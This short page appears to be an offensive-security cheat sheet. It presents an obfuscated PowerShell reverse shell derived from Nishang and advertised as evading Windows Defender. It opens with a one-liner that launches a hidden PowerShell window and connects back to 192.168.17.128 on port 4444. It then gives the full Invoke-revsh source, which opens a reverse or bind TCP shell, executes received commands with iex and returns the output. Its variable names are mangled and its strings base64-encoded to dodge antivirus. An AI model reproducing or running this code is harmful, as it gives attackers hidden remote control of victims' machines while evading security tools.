Nishang Reverse Shell - Obfuscated

*Evades Windows Defender*

~~~PowerShell
Start-Process powershell.exe -windowstyle hidden "import-module C:\Users\Admin\Desktop\invoke-revsh.ps1; invoke-revsh -reverse -ipaddress 192.168.17.128 -port 4444" ; exit
~~~

~~~PowerShell
function Invoke-revsh 
{       
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,
        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,
        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind
    )
    try 
    {
        if ($Reverse)
        {
            ${_/\/=\__/=\___/=\} = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }
        if ($Bind)
        {
            ${_/=\___/=====\/==} = [System.Net.Sockets.TcpListener]$Port
            ${_/=\___/=====\/==}.start()    
            ${_/\/=\__/=\___/=\} = ${_/=\___/=====\/==}.AcceptTcpClient()
        } 
        ${/==\__/\_/\_/\_/=} = ${_/\/=\__/=\___/=\}.GetStream()
        [byte[]]${__/===\_/\__/\/\/} = 0..65535|%{0}
        ${___/=====\/\_/=\/} = ([text.encoding]::ASCII).GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAByAHUAbgBuAGkAbgBnACAAYQBzACAAdQBzAGUAcgAgAA=='))) + $env:username + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABvAG4AIAA='))) + $env:computername + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBDAG8AcAB5AHIAaQBnAGgAdAAgACgAQwApACAAMgAwADEANQAgAE0AaQBjAHIAbwBzAG8AZgB0ACAAQwBvAHIAcABvAHIAYQB0AGkAbwBuAC4AIABBAGwAbAAgAHIAaQBnAGgAdABzACAAcgBlAHMAZQByAHYAZQBkAC4ACgAKAA=='))))
        ${/==\__/\_/\_/\_/=}.Write(${___/=====\/\_/=\/},0,${___/=====\/\_/=\/}.Length)
        ${___/=====\/\_/=\/} = ([text.encoding]::ASCII).GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTACAA'))) + (gl).Path + '>')
        ${/==\__/\_/\_/\_/=}.Write(${___/=====\/\_/=\/},0,${___/=====\/\_/=\/}.Length)
        while((${____/\_/\_/====\/} = ${/==\__/\_/\_/\_/=}.Read(${__/===\_/\__/\/\/}, 0, ${__/===\_/\__/\/\/}.Length)) -ne 0)
        {
            ${/==\/==\/==\/\/\/} = New-Object -TypeName System.Text.ASCIIEncoding
            ${_/=\______/=\_/=\} = ${/==\/==\/==\/\/\/}.GetString(${__/===\_/\__/\/\/},0, ${____/\_/\_/====\/})
            try
            {
                ${_/==\___/\__/\/\/} = (iex -Command ${_/=\______/=\_/=\} 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACAAdwBpAHQAaAAgAGUAeABlAGMAdQB0AGkAbwBuACAAbwBmACAAYwBvAG0AbQBhAG4AZAAgAG8AbgAgAHQAaABlACAAdABhAHIAZwBlAHQALgA='))) 
                Write-Error $_
            }
            ${_/==\/\_/\/\/=\__}  = ${_/==\___/\__/\/\/} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTACAA'))) + (gl).Path + '> '
            ${_/\___/==\/===\/\} = ($error[0] | Out-String)
            $error.clear()
            ${_/==\/\_/\/\/=\__} = ${_/==\/\_/\/\/=\__} + ${_/\___/==\/===\/\}
            ${__/\_/\_/\_/==\/\} = ([text.encoding]::ASCII).GetBytes(${_/==\/\_/\/\/=\__})
            ${/==\__/\_/\_/\_/=}.Write(${__/\_/\_/\_/==\/\},0,${__/\_/\_/\_/==\/\}.Length)
            ${/==\__/\_/\_/\_/=}.Flush()  
        }
        ${_/\/=\__/=\___/=\}.Close()
        if (${_/=\___/=====\/==})
        {
            ${_/=\___/=====\/==}.Stop()
        }
    }
    catch
    {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACEAIABDAGgAZQBjAGsAIABpAGYAIAB0AGgAZQAgAHMAZQByAHYAZQByACAAaQBzACAAcgBlAGEAYwBoAGEAYgBsAGUAIABhAG4AZAAgAHkAbwB1ACAAYQByAGUAIAB1AHMAaQBuAGcAIAB0AGgAZQAgAGMAbwByAHIAZQBjAHQAIABwAG8AcgB0AC4A'))) 
        Write-Error $_
    }
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
